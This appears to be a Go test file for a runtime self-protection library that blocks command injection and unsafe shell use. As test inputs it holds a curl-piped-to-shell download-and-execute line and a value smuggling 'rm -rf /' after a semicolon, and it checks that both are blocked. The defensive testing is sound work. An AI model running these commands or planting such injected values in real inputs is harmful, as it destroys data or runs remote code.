package rasp

import (
	"context"
	"errors"
	"os/exec"
	"strings"
	"testing"
)

func requireSh(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no sh")
	}
}

func TestCommandContract(t *testing.T) {
	requireSh(t)
	// A harmless command line holding the input across two shell tokens.
	const input = "kit; echo ok"
	runSinkContract(t, sinkCase{
		name:   "rasp.CommandContext",
		attack: CommandInjection,
		inputs: AddInput(nil, input, "query.name"),
		// sh is allowed so shell_spawn stays quiet: with command_injection
		// off, a shell_spawn block would otherwise (rightly) still stop the call.
		allow: Allow{Commands: []string{"sh"}},
		call: func(t *testing.T, ctx context.Context) (bool, error) {
			out, err := CommandContext(ctx, "sh", "-c", "echo "+input).Output()
			return strings.Contains(string(out), "ok"), err
		},
		composed: map[string]sinkCall{
			// Code that configures the command after it is built (a helper
			// setting Env, Dir, output) keeps the check.
			"configured after it is built": func(t *testing.T, ctx context.Context) (bool, error) {
				cmd := CommandContext(ctx, "sh", "-c", "echo "+input)
				var out strings.Builder
				cmd.Stdout = &out
				cmd.Env = []string{"KIT=1"}
				cmd.Dir = t.TempDir()
				err := cmd.Run()
				return strings.Contains(out.String(), "ok"), err
			},
		},
	})
}

func TestCommandRules(t *testing.T) {
	requireSh(t)
	t.Run("argv[0] from input is cmdi.executable", func(t *testing.T) {
		setupEngine(t, engineSettings{mode: ModeBlock})
		ctx := requestCtx(AddInput(nil, "true", "query.tool"), nil)
		err := CommandContext(ctx, "true").Run()
		if b := AsBlocked(err); b == nil || b.Rule != "cmdi.executable" {
			t.Fatalf("got %v", err)
		}
	})
	t.Run("a shell during a request is shell_spawn, unless allowed", func(t *testing.T) {
		setupEngine(t, engineSettings{mode: ModeBlock})
		ctx := requestCtx(AddInput(nil, "unrelated", "query.q"), nil)
		err := CommandContext(ctx, "sh", "-c", "true").Run()
		if b := AsBlocked(err); b == nil || b.Rule != "shell_spawn.shell" {
			t.Fatalf("got %v", err)
		}
		setupEngine(t, engineSettings{mode: ModeBlock, allow: Allow{Commands: []string{"sh"}}})
		if err := CommandContext(ctx, "sh", "-c", "true").Run(); err != nil {
			t.Fatal(err)
		}
	})
	t.Run("downloader piped to a shell is reported with no request in scope", func(t *testing.T) {
		log := setupEngine(t, engineSettings{mode: ModeBlock})
		cmd := Command("sh", "-c", "curl -s https://example.invalid/x | sh")
		if b := AsBlocked(cmd.Err); b == nil || b.Rule != "shell_spawn.download_exec" {
			t.Fatalf("got %v", cmd.Err)
		}
		if err := cmd.Run(); !errors.Is(err, ErrBlocked) {
			t.Fatalf("Run: %v", err)
		}
		if len(log.all()) != 1 {
			t.Fatalf("events %v", log.all())
		}
	})
	t.Run("plain commands outside a request pass", func(t *testing.T) {
		log := setupEngine(t, engineSettings{mode: ModeBlock})
		if err := Command("true").Run(); err != nil {
			t.Fatal(err)
		}
		if err := CommandContext(context.Background(), "sh", "-c", "true").Run(); err != nil {
			t.Fatal(err)
		}
		if len(log.all()) != 0 {
			t.Fatalf("events %v", log.all())
		}
	})
	t.Run("CheckCommand and CheckShellCommand", func(t *testing.T) {
		setupEngine(t, engineSettings{mode: ModeBlock})
		ctx := requestCtx(AddInput(nil, "a.txt; rm -rf /", "query.f"), nil)
		if err := CheckCommand(ctx, []string{"bash", "-c", "cat a.txt; rm -rf /"}); AsBlocked(err) == nil {
			t.Fatalf("argv: %v", err)
		}
		if err := CheckShellCommand(ctx, "cat a.txt; rm -rf /"); AsBlocked(err) == nil {
			t.Fatalf("line: %v", err)
		}
		if err := CheckCommand(ctx, []string{"cat", "a.txt"}); err != nil {
			t.Fatal(err)
		}
	})
}
